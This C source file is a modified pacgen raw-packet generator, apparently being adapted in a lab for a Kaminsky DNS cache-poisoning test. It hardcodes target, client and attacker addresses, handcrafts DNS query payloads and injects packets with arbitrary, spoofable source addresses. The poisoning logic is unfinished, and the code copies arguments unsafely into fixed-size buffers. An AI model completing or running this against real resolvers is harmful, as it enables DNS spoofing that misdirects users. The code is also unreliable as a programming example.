/*		    GNU GENERAL PUBLIC LICENSE
		    Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/

#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "pacgen.h"


    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    char eth_file[FILENAME_MAX] = "";
    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char payload_file[FILENAME_MAX] = "";
    char *payload_location;
    
    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;

    /*
     * DNS payload used for Kaminsky attack
     */
#if 1

#define domain  "dnsArmorTest.com"

#define MY_PORT "eth11"
#define CLIENT_IP "192.168.0.38"
#define TARGET_DNS_SERVER_IP "192.168.0.44"
#define ATTACKER_IP "192.168.0.43"
#define OTHER_DNS_IP "20.20.20.20"
#define DNS_HEADER_LEN 12

    unsigned char *sub_domain = NULL;

    unsigned char client_ip_addr[] = CLIENT_IP;
    unsigned char target_DNS_server_ip_addr[] = TARGET_DNS_SERVER_IP;
    unsigned char other_DNS_server_ip_addr[] = OTHER_DNS_IP;
    
    u_long client_ip;
    u_long target_DNS_server_ip;
    u_long other_DNS_server_ip;
#endif
    /*
     * End of DNS payload used for Kaminsky attack
     */
    u_short t_src_port;		/* TCP source port */
    u_short t_des_port;		/* TCP dest port */
    u_short t_win;		/* TCP window size */
    u_short t_urgent;		/* TCP urgent data pointer */
    u_short i_id;		/* IP id */
    u_short i_frag;		/* IP frag */
    u_short head_type;          /* TCP or UDP */

    u_long t_ack;		/* TCP ack number */
    u_long t_seq;		/* TCP sequence number */
    u_long i_des_addr;		/* IP dest addr */
    u_long i_src_addr;		/* IP source addr */

    u_char i_ttos[90];		/* IP TOS string */
    u_char t_control[65];	/* TCP control string */

    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    u_long eth_pktcount;        /* How many packets to send */
    long nap_time;              /* How long to sleep */

    u_char ip_proto[40];

    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};

    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char t_control_val = 0;	/* final or'd value for tcp control */
    u_char i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */

int
main(int argc, char *argv[])
{
	/*
	 *  Initialize the library.  Root priviledges are required.
	 */

	l = libnet_init(
			LIBNET_LINK,                             /* injection type */
			/*            NULL, */                                   /* network interface eth0, eth1, etc. NULL is default.*/
			MY_PORT,                                /* network interface eth0, eth1, etc. NULL is default.*/
			errbuf);                                 /* error buffer */

	if (l == NULL)
	{
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(EXIT_FAILURE); 
	}

	/*  src_ip  = 0;
	    dst_ip  = 0;
	    src_prt = 0;
	    dst_prt = 0;
	    payload = NULL;
	    payload_s = 0;
	 */
	while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
	{
		switch (c)
		{
			case 'p':
				strcpy(payload_file, optarg);
				break;
			case 't':
				strcpy(tcp_file, optarg);
				break;
			case 'i':
				strcpy(ip_file, optarg);
				break;
			case 'e':
				strcpy(eth_file, optarg);
				break;
			default:
				break;
		}
	}

	if (optind != 9)
	{    
		usage();
		exit(0);
	}


    	/*
     	 * DNS payload used for Kaminsky attack
     	 */
	client_ip = libnet_name2addr4(l, client_ip_addr, LIBNET_RESOLVE);
	target_DNS_server_ip = libnet_name2addr4(l, target_DNS_server_ip_addr, LIBNET_RESOLVE);
	other_DNS_server_ip = libnet_name2addr4(l, other_DNS_server_ip_addr, LIBNET_RESOLVE);
	
	/* Use current time in sec as a seed for random number generation */
	struct timeval tv;
	gettimeofday(&tv, NULL);
	srand(tv.tv_sec);

	/* Generate random number using rand function and generate randomized prefix */
	int prefix = rand() % 1000000;
	
	printf("allocate memory for sub domain\n");

	/* more Randomize */
	while(prefix < 99999) {
		prefix *= 52;
	}

	printf("prefix %d\n",prefix);	

	sub_domain = (char *) malloc (128);
	if(!sub_domain) {
		printf("\nFailed to allocate memory\n");
		exit(1);
	}
	printf("generate sub domain\n");
	sprintf(sub_domain, "ypatil%d.", prefix);
	printf("comcatenate sub domain\n");
	printf("s len %d d len %d\n",strlen(sub_domain),strlen(domain));
//	strcat(sub_domain, "crapbag.com");
	printf("\n Here %s", sub_domain);

	
	
	load_payload();
	load_ethernet();
	load_tcp_udp();
	load_ip();
	convert_proto();

	/*    Testing tcp header options

	      t = libnet_build_tcp_options(
	      "\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000",
	      20,
	      l,
	      0);
	      if (t == -1)
	      {
	      fprintf(stderr, "Can't build TCP options: %s\n", libnet_geterror(l));
	      goto bad;
	      }
	 */

	if(ip_proto_val==IPPROTO_TCP){    
		t = libnet_build_tcp(
				t_src_port,                                    /* source port */
				t_des_port,                                    /* destination port */
				t_seq,                                         /* sequence number */
				t_ack,                                         /* acknowledgement num */
				t_control_val,                                 /* control flags */
				t_win,                                         /* window size */
				0,                                             /* checksum */
				t_urgent,                                      /* urgent pointer */
				LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
				payload_location,                              /* payload */
				payload_filesize,                              /* payload size */
				l,                                             /* libnet handle */
				0);                                            /* libnet id */

		head_type = LIBNET_TCP_H;

		if (t == -1)
		{
			fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
			goto bad;
		}

	}

	if(ip_proto_val==IPPROTO_UDP){
		t = libnet_build_udp(
				t_src_port,                                /* source port */
				t_des_port,                                /* destination port */
				LIBNET_UDP_H + payload_filesize,           /* packet length */
				0,                                         /* checksum */
				payload_location,                          /* payload */
				payload_filesize,                          /* payload size */
				l,                                         /* libnet handle */
				0);                                        /* libnet id */
		head_type = LIBNET_UDP_H;
		if (t == -1)
		{
			fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
			goto bad;
		}
	}


	t = libnet_build_ipv4(
			/*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
			LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
			i_ttos_val,                                            /* TOS */
			i_id,                                                  /* IP ID */
			i_frag,                                                /* IP Frag */
			i_ttl,                                                 /* TTL */
			ip_proto_val,                                          /* protocol */
			0,                                                     /* checksum */
			i_src_addr,                                            /* source IP */
			i_des_addr,                                            /* destination IP */
			NULL,                                                  /* payload */
			0,                                                     /* payload size */
			l,                                                     /* libnet handle */
			0);                                                    /* libnet id */
	if (t == -1)
	{
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	}

	t = libnet_build_ethernet(
			eth_daddr,                                   /* ethernet destination */
			eth_saddr,                                   /* ethernet source */
			e_proto_val,                                 /* protocol type */
			NULL,                                        /* payload */
			0,                                           /* payload size */
			l,                                           /* libnet handle */
			0);                                          /* libnet id */
	if (t == -1)
	{
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	}
	/*	
	 *  Write it to the wire.
	 */

	if (nap_time >= 0)
		printf("You have chosen to send %d packets every %d seconds. \
				\nYou will need to press CTRL-C to halt this process.\n", \
				eth_pktcount, nap_time);

	if (nap_time == -1)
		printf("You have chose to send %d packets and quit.\n",eth_pktcount);

	for(z=0;y<100;z++)  /* setup fake loop to begin infinit loop. This is on purpose because I'm a moron. :-) */
	{
		for(x=0;x < eth_pktcount;x++) /* Nested packet count loop */
		{
			c = libnet_write(l);
		}
		if (nap_time == -1){
			y=999;
			nap_time = 0;
		}
		sleep(nap_time);         /*Pause of this many seconds then loop again*/
		z=1;
	}

	printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */

	/* give the buf memory back */

	//libnet_destroy(l);
bad:
	libnet_destroy(l);
	return (EXIT_FAILURE);

}

usage()
{
    fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
}

    /* load_payload: load the payload into memory */
load_payload()
{
    FILE *infile;
    struct stat statbuf;
    int i = 12,k,l,m;
    int c = 0;

    /* get the file size so we can figure out how much memory to allocate */
 
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size;

    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */

    infile = fopen(payload_file, "r");	/* open the payload file read only */
    
    payload_location[0] = 0x20; payload_location[1] = 0x20;
    payload_location[2] = 0x81; payload_location[3] = 0x00;
    payload_location[4] = 0x00; payload_location[5] = 0x01;
    payload_location[6] = 0x00; payload_location[7] = 0x00;
    payload_location[8] = 0x00; payload_location[9] = 0x00;
    payload_location[10] = 0x00; payload_location[11] = 0x00;
   
    payload_filesize += DNS_HEADER_LEN;
   // payload_location[12] = 0x03;
    payload_filesize ++;
//int i=0;
	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");

	char nprefix[] = "www";
	char name[] = "gandu";
	char ndomain[] = "chodu";

	/*unsigned char l_prefix[10];
	unsigned char l_name[10];
	unsigned char l_domain[10];
	
	sprintf(l_prefix, "%d", strlen(nprefix));	
	sprintf(l_name, "%d", strlen(name));	
	sprintf(l_domain, "%d", strlen(ndomain));	

	printf("prefix %s\n",l_prefix);
	printf("name %s\n",l_name);  
	printf("domain %s\n",l_domain); 
	char l_p[1];
	char l_n[1];
	char l_d[1];

	
	sprintf(l_p,"%d",strlen(nprefix));
	sprintf(l_n,"%d",strlen(name));  
	sprintf(l_d,"%d",strlen(ndomain)); 

	printf("prefix %X\n",l_p[0]);
	printf("name %X\n",l_n[0]);  
	printf("domain %X\n",l_d[0]);
 */

	unsigned int l_p = strlen(nprefix);
	unsigned int l_n = strlen(name);
	unsigned int l_d = strlen(ndomain);

	i=12;
	
	payload_location[i] = l_p;
	i++;
	
	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");
	
	for(k =0;k<strlen(nprefix);k++){
		printf("i %d k%d\n",i,k);
		payload_location[i] = nprefix[k];
		i++;
	}
	
	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");
	
	payload_location[i] = l_n;
	i++;

	
	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");
	
	for(l =0;l<strlen(name);l++){
		payload_location[i] = name[l];
		i++;
	}

	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");

	payload_location[i] = l_d;
	i++;
	

	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");

	for(m =0;m<strlen(ndomain);m++){
		payload_location[i] = ndomain[m];
		i++;
	}
	
	payload_location[i] = 0x00;i++; 
	payload_location[i] = 0x00;i++; payload_location[i] = 0x01;i++;
	payload_location[i] = 0x00;i++; payload_location[i] = 0x01;i++;

	printf("payload ");
	for(l=0;l<i;l++){
	printf("%X ",payload_location[l]);
	}
	printf("\n");

/*    i = 1;
    int j = 0;
    int len = strlen(sub_domain);
    while(j<len) {
        *(payload_location + DNS_HEADER_LEN + i) = sub_domain[j];
	i++;
	j++;
    }
    payload_filesize +=j;*/
    //printf("\n Payload %s \n %s\n Len: %d", payload_location, (payload_location + DNS_HEADER_LEN), payload_filesize);
	fflush(stdout);
    fclose(infile);
}

    /* load_ethernet: load ethernet data file into the variables */
load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);	/*read the source port*/
    fgets(dport_line, 15, infile); 	/*read the dest port*/
    fgets(win_line, 12, infile);	/*read the win num*/
    fgets(urg_line, 12, infile);	/*read the urg id*/
    fgets(seq_line, 13, infile);	/*read the seq num*/
    fgets(ack_line, 13, infile);	/*read the ack id*/
    fgets(control_line, 63, infile);	/*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}



    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

	if(strstr(eth_proto, "arp") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_ARP;

	if(strstr(eth_proto, "ip") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_IP;

	if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

	if(strstr(ip_proto, "udp") != NULL)
	  ip_proto_val = ip_proto_val | IPPROTO_UDP;
}

    /* convert_toscontrol:  or flags in strings to make u_chars */
convert_toscontrol()
{
    if(strstr(t_control, "th_urg") != NULL)
        t_control_val = t_control_val | TH_URG;

    if(strstr(t_control, "th_ack") != NULL)
        t_control_val = t_control_val | TH_ACK;

    if(strstr(t_control, "th_psh") != NULL)
        t_control_val = t_control_val | TH_PUSH;

    if(strstr(t_control, "th_rst") != NULL)
        t_control_val = t_control_val | TH_RST;

    if(strstr(t_control, "th_syn") != NULL)
        t_control_val = t_control_val | TH_SYN;

    if(strstr(t_control, "th_fin") != NULL)
        t_control_val = t_control_val | TH_FIN;

    if(strstr(i_ttos, "iptos_lowdelay") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_LOWDELAY;

    if(strstr(i_ttos, "iptos_throughput") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_THROUGHPUT;

    if(strstr(i_ttos, "iptos_reliability") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_RELIABILITY;

    if(strstr(i_ttos, "iptos_mincost") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_MINCOST;
}

/* EOF */
